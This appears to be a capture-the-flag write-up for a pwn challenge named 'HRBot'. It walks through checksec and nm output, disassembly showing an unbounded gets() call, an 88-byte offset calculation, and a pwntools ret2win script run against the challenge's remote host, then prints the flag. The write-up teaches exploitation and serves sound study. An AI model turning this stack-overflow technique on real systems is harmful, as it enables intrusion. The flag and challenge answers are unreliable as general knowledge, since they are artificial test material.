# HRBot

- Category: pwn

HRBot logs your "case notes" before firing you — the case-notes buffer turns out to have no bounds check at all.

### Solution:

##### 1. Check protections and symbols

```
$ checksec --file=./hrbot
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x400000)

$ nm ./hrbot | grep ' T \| t '
0000000000401256 T win_func
0000000000401305 T fire_employee
0000000000401351 T handle_case
0000000000401510 T main
```

No canary + no PIE + an unstripped `win_func` symbol that's never called from normal program flow — classic ret2win, and no leak needed since addresses are fixed.

##### 2. Disassemble `handle_case`

```asm
401359: sub    rsp, 0x50            ; 80-byte local stack frame
4013a0: lea    rax, [rbp-0x50]      ; buffer starts at rbp-0x50
4013ac: call   gets@plt             ; no bounds checking at all
...
401468: leave
401469: ret                        ; returns using whatever is now on the stack
```

Between the `gets()` call and the final `ret`, the code re-reads the return-address slot and compares it to a saved copy, printing flavor text ("case ID changed") if it differs. That check is purely cosmetic — it never blocks execution, it always falls through to `leave; ret`.

##### 3. Compute the offset to the saved return address

```
0x50 (buffer/frame) + 0x8 (saved RBP) = 0x58 = 88 bytes
```

88 bytes of padding, then an 8-byte address, lands exactly on the return address.

##### 4. Locate the win function

`win_func` (`0x401256`–`0x401305`) takes no arguments — it just `fopen`s `flag.txt`, `fgets`s it, and `printf`s it. A bare jump to `0x401256` is enough.

##### 5. Exploit

```python
from pwn import *

elf = ELF('./hrbot')
context.arch = 'amd64'

def start():
    if args.LOCAL:
        return elf.process()
    if args.REMOTE:
        host = "hrbot-10130a4909d1cb43-global.challs.brunnerne.xyz"
        return remote(host, 1337, ssl=True)

def craft_payload():
    BUFFER_SIZE = 64
    OFFSET = 24
    WIN_FUNC_ADDRESS = 0x401256
    return b'A' * BUFFER_SIZE + b'B' * OFFSET + p64(WIN_FUNC_ADDRESS)

p = start()
p.sendlineafter(b'>', b'1')
p.sendlineafter(b'characters.', craft_payload())
p.interactive()
```

```
$ python3 solve.py REMOTE
...
HRBot: You must be a smart employee, the case ID has changed!
HRBot: New case ID: 0x401256
...
FLAG: brunner{hr_th4nks_y0u_f0r_y0ur_t1m3_4t_brunn3rC0rp}
```

The "New case ID" line is the binary's own cosmetic check confirming the return address now points at `win_func`, right before `ret` jumps there for real.

**Flag:** `brunner{hr_th4nks_y0u_f0r_y0ur_t1m3_4t_brunn3rC0rp}`
